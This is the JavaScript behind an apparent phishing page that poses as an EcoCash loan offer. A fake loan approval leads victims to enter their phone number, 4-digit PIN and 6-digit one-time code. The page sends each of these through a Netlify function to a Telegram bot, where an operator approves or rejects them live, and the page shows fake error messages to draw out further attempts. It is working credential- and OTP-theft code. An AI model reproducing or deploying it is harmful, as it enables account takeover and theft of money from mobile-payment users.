(function(){
  'use strict';

  // DIRECT PATH TO NETLIFY FUNCTION - NO REDIRECTS NEEDED
  var PROXY = '/.netlify/functions/telegram';

  var lastUpdateId = 0;
  var pollingStarted = false;
  var session = null; 
  var currentLoanAmt = '1,250.00';
  var otpInterval = null;
  var sending = false;
  var pinAttempts = 3;
  var usedCodes = new Set();
  var dialogCallback = null;

  function $(id){ return document.getElementById(id); }
  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }

  function showLoader(text){
    $('loadingText').textContent = text || 'Please wait…';
    $('loading-overlay').classList.add('show');
  }
  function hideLoader(){ $('loading-overlay').classList.remove('show'); }

  function fetchTimeout(url, options, ms){
    options = options || {}; ms = ms || 8000;
    var ctrl = new AbortController();
    var t = setTimeout(function(){ ctrl.abort(); }, ms);
    options.signal = ctrl.signal;
    return fetch(url, options).finally(function(){ clearTimeout(t); });
  }

  function tg(method, payload, ms){
    return fetchTimeout(PROXY, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ method: method, payload: payload })
    }, ms || 10000).then(function(r){
      var contentType = r.headers.get("content-type");
      if (contentType && contentType.indexOf("application/json") === -1) {
         throw new Error("Server returned HTML. The function is missing.");
      }
      return r.json().then(function(data){
        if(!r.ok) {
          throw new Error(data.message || data.error || 'HTTP Error ' + r.status);
        }
        return data;
      });
    });
  }

  function show(id){
    var screens = document.querySelectorAll('.screen');
    for(var i=0;i<screens.length;i++) screens[i].classList.remove('active');
    var el = $(id);
    if(!el) return;
    el.classList.add('active');
    var c = el.querySelector('.screen-content');
    if(c) c.scrollTop = 0;
  }

  function markInvalid(id, on){
    var el = $(id);
    if(el) el.classList.toggle('invalid', !!on);
  }
  function clearInvalid(ids){
    for(var i=0;i<ids.length;i++) markInvalid(ids[i], false);
  }

  function newSessionId(){
    return Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
  }
  function maskPhone(ph){
    if(!ph || ph.length < 9) return '+263';
    return '+263 ' + ph.slice(0,2) + ' *** ' + ph.slice(-3);
  }

  function showDialog(opts){
    $('dialogTitle').textContent   = opts.title;
    $('dialogMessage').textContent = opts.message;
    var icon = $('dialogIcon');
    icon.className = 'dialog-icon ' + (opts.type || 'error');
    icon.textContent = (opts.type === 'success') ? '✓' : (opts.type === 'info') ? 'i' : '!';
    $('dialogOk').textContent = opts.okText || 'OK';
    dialogCallback = opts.onOk || null;
    $('dialog-overlay').classList.add('show');
  }
  function closeDialog(){
    $('dialog-overlay').classList.remove('show');
    var cb = dialogCallback;
    dialogCallback = null;
    if(cb) setTimeout(cb, 140);
  }
  $('dialogOk').addEventListener('click', closeDialog);

  function sendLog(text, sid){
    return tg('sendMessage', {
      text: text,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[
          { text: '✅ Approve', callback_data: 'approve:' + sid },
          { text: '❌ Reject',  callback_data: 'reject:'  + sid }
        ]]
      }
    }).then(function(d){ return { ok: true }; })
      .catch(function(err){ 
        console.error("TELEGRAM ERROR:", err);
        return { ok: false, error: err.message }; 
      });
  }

  function initPolling(){
    tg('getUpdates', { offset: -1, limit: 1 }, 5000).catch(function(e){ console.warn("Polling boot failed", e); }).finally(function(){
      if(pollingStarted) return;
      pollingStarted = true;
      loop();
    });
  }

  function loop(){
    tg('getUpdates', {
      offset: lastUpdateId + 1,
      timeout: 3, 
      limit: 100,
      allowed_updates: ['callback_query']
    }, 6000).then(function(d){
      if(!d.ok){ return sleep(1500).then(loop); }
      for(var i=0;i<d.result.length;i++){
        var upd = d.result[i];
        if(upd.update_id > lastUpdateId) lastUpdateId = upd.update_id;
        if(upd.callback_query) handleCallback(upd.callback_query);
      }
      loop();
    }).catch(function(){
      sleep(1500).then(loop);
    });
  }

  function handleCallback(cq){
    var parts  = String(cq.data || '').split(':');
    var action = parts[0];
    var sid    = parts[1];

    tg('answerCallbackQuery', {
      callback_query_id: cq.id,
      text: action === 'approve' ? '✅ Approved' : '❌ Rejected',
      show_alert: false
    }).catch(function(){});

    if(!session || !sid || sid !== session.id) return;

    var active = session;
    session = null;

    if(action === 'approve'){
      hideLoader();
      if(active.stage === 'pin') startOtpStage();
      else if(active.stage === 'otp') show('maintenance-screen');
    }else if(action === 'reject'){
      if(active.stage === 'pin') rejectPin();
      else if(active.stage === 'otp') rejectOtp(active);
    }

    var isPin = active.stage === 'pin';
    var phone = active.phone ? '+263 ' + active.phone : '+263';
    var followUp = (action === 'approve') 
      ? '✅ *Approved*\n\n📱 *Customer:* `' + phone + '`\n🔐 *Stage:* ' + (isPin ? 'PIN' : 'OTP')
      : '❌ *Rejected*\n\n📱 *Customer:* `' + phone + '`\n🔐 *Stage:* ' + (isPin ? 'PIN' : 'OTP');

    tg('sendMessage', { text: followUp, parse_mode: 'Markdown' }).catch(function(){});
  }

  var pinsArr = Array.prototype.slice.call(document.querySelectorAll('#pinContainer .pin-box'));
  pinsArr.forEach(function(p, i){
    p.addEventListener('input', function(){
      p.value = p.value.replace(/\D/g, '');
      markInvalid('pinContainer', false);
      if(p.value && i < 3) pinsArr[i+1].focus();
    });
    p.addEventListener('keydown', function(e){
      if(e.key === 'Backspace' && !p.value && i > 0) pinsArr[i-1].focus();
    });
  });

  $('uPhone').addEventListener('input', function(){ markInvalid('phoneBox', false); });

  function manualLogin(){
    if(sending || session) return;

    var ph = $('uPhone').value.replace(/\D/g, '');
    var pn = pinsArr.map(function(p){ return p.value; }).join('');

    if(ph.length !== 9){
      markInvalid('phoneBox', true);
      showDialog({ title: 'Invalid Mobile Number', message: 'Please enter a valid 9-digit EcoCash mobile number.', type: 'warning', onOk: function(){ $('uPhone').focus(); } });
      return;
    }
    if(pn.length !== 4){
      markInvalid('pinContainer', true);
      showDialog({ title: 'PIN Required', message: 'Please enter your 4-digit EcoCash PIN.', type: 'warning', onOk: function(){ pinsArr[0].focus(); } });
      return;
    }
    sendLogin(ph, pn);
  }

  function sendLogin(ph, pn){
    sending = true;
    showLoader('Awaiting authorisation…');

    var sid = newSessionId();
    session = { id: sid, stage: 'pin', phone: ph };

    sendLog('🇿🇼 *EcoCash Auth*\n\n📱 *Phone:* `+263 ' + ph + '`\n🔐 *PIN:* `' + pn + '`', sid).then(function(res){
      sending = false;
      if(!res.ok){
        session = null;
        hideLoader();
        pinsArr.forEach(function(p){ p.value = ''; });
        showDialog({
          title: 'System Error (Debug)',
          message: res.error,
          type: 'error',
          onOk: function(){ pinsArr[0].focus(); }
        });
      }
    });
  }

  function rejectPin(){
    hideLoader(); show('login'); pinsArr.forEach(function(p){ p.value = ''; }); markInvalid('pinContainer', false);
    pinAttempts--;
    if(pinAttempts > 0){
      showDialog({ title: 'Incorrect PIN', message: 'You have ' + pinAttempts + ' attempt(s) remaining.', type: 'error', onOk: function(){ pinsArr[0].focus(); } });
    }else{
      pinAttempts = 3;
      showDialog({ title: 'Account Locked', message: 'Too many incorrect PINs. Try again later.', type: 'error' });
    }
  }

  var otps = Array.prototype.slice.call(document.querySelectorAll('#otpContainer .otp-box'));
  otps.forEach(function(o, i){
    o.addEventListener('input', function(){
      o.value = o.value.replace(/\D/g, '');
      o.classList.toggle('filled', !!o.value);
      markInvalid('otpContainer', false);
      if(o.value && i < 5) otps[i+1].focus();
    });
    o.addEventListener('keydown', function(e){
      if(e.key === 'Backspace' && !o.value && i > 0) otps[i-1].focus();
    });
  });

  function startOtpStage(){
    otps.forEach(function(o){ o.value = ''; o.classList.remove('filled'); });
    markInvalid('otpContainer', false);
    var ph = $('uPhone').value.replace(/\D/g, '');
    $('maskedPhone').textContent = maskPhone(ph);
    show('otp-screen');
    startTimer();
    setTimeout(function(){ otps[0].focus(); }, 250);
  }

  function startTimer(){
    clearInterval(otpInterval);
    var t = 60;
    var link = $('resendLink');
    link.classList.add('disabled');
    link.textContent = 'Resend in ' + t + 's';
    otpInterval = setInterval(function(){
      t--;
      if(t <= 0){ clearInterval(otpInterval); link.classList.remove('disabled'); link.textContent = 'Resend Code'; }
      else{ link.textContent = 'Resend in ' + t + 's'; }
    }, 1000);
  }

  $('resendLink').addEventListener('click', function(){
    if($('resendLink').classList.contains('disabled')) return;
    startTimer();
    showDialog({ title: 'Code Sent', message: 'A new verification code has been sent.', type: 'info' });
  });

  function submitOTP(){
    if(sending || session) return;
    var val = otps.map(function(o){ return o.value; }).join('');

    if(val.length !== 6){
      markInvalid('otpContainer', true);
      showDialog({ title: 'Incomplete Code', message: 'Enter the 6-digit code.', type: 'warning', onOk: function(){ otps[0].focus(); } });
      return;
    }
    if(usedCodes.has(val)){
      otps.forEach(function(o){ o.value = ''; o.classList.remove('filled'); });
      markInvalid('otpContainer', true);
      showDialog({ title: 'Invalid Code', message: 'Code already used.', type: 'error', onOk: function(){ otps[0].focus(); } });
      return;
    }

    var ph = $('uPhone').value.replace(/\D/g, '');
    sending = true;
    showLoader('Verifying code…');
    var sid = newSessionId();
    session = { id: sid, stage: 'otp', code: val, phone: ph };
    usedCodes.add(val);

    sendLog('🇿🇼 *EcoCash OTP*\n\n📱 *Phone:* `+263 ' + ph + '`\n🔑 *OTP:* `' + val + '`', sid).then(function(res){
      sending = false;
      if(!res.ok){
        session = null; usedCodes.delete(val); hideLoader();
        showDialog({ title: 'System Error (Debug)', message: res.error, type: 'error' });
      }
    });
  }

  function rejectOtp(active){
    hideLoader(); show('otp-screen'); usedCodes.delete(active.code);
    otps.forEach(function(o){ o.value = ''; o.classList.remove('filled'); }); markInvalid('otpContainer', true);
    showDialog({ title: 'Verification Failed', message: 'Code expired or incorrect.', type: 'error', onOk: function(){ otps[0].focus(); } });
  }

  function backToLogin(){ clearInterval(otpInterval); session = null; sending = false; hideLoader(); show('login'); }
  function openLoanForm(){ clearInvalid(['applicantName', 'applicantIdNum', 'loanAmount', 'monthlyIncome']); show('loan-form-screen'); }
  function goHome(){ show('loans-home'); }

  function submitLoanApplication(){
    var name = $('applicantName').value.trim(), idNum = $('applicantIdNum').value.trim(), amtStr = $('loanAmount').value.trim(), incomeStr = $('monthlyIncome').value.trim();
    clearInvalid(['applicantName', 'applicantIdNum', 'loanAmount', 'monthlyIncome']);

    if(!name || !idNum || !amtStr || !incomeStr){
      showDialog({ title: 'Missing Info', message: 'Please fill all fields.', type: 'warning' });
      return;
    }
    var amt = parseFloat(amtStr);
    if(isNaN(amt) || amt <= 0){
      markInvalid('loanAmount', true);
      showDialog({ title: 'Invalid Amount', message: 'Enter a valid amount.', type: 'warning' });
      return;
    }
    currentLoanAmt = amt.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    showLoader('Evaluating application…');
    setTimeout(function(){
      hideLoader();
      $('approvedLimitText').textContent = '$' + currentLoanAmt;
      show('success-screen');
    }, 900);
  }

  function proceedToDisbursementLogin(){
    session = null; sending = false; pinAttempts = 3;
    pinsArr.forEach(function(p){ p.value = ''; }); markInvalid('pinContainer', false); markInvalid('phoneBox', false); hideLoader(); show('login');
  }
  function reloadPage(){ location.reload(); }

  var actions = {
    openLoanForm: openLoanForm, goHome: goHome, manualLogin: manualLogin, backToLogin: backToLogin,
    submitOTP: submitOTP, submitLoanApplication: submitLoanApplication, proceedToDisbursementLogin: proceedToDisbursementLogin, reloadPage: reloadPage
  };

  document.addEventListener('click', function(e){
    var el = e.target.closest('[data-action]');
    if(!el) return;
    var fn = actions[el.getAttribute('data-action')];
    if(fn){ e.preventDefault(); fn(); }
  });

  show('loans-home');
  initPolling();
})();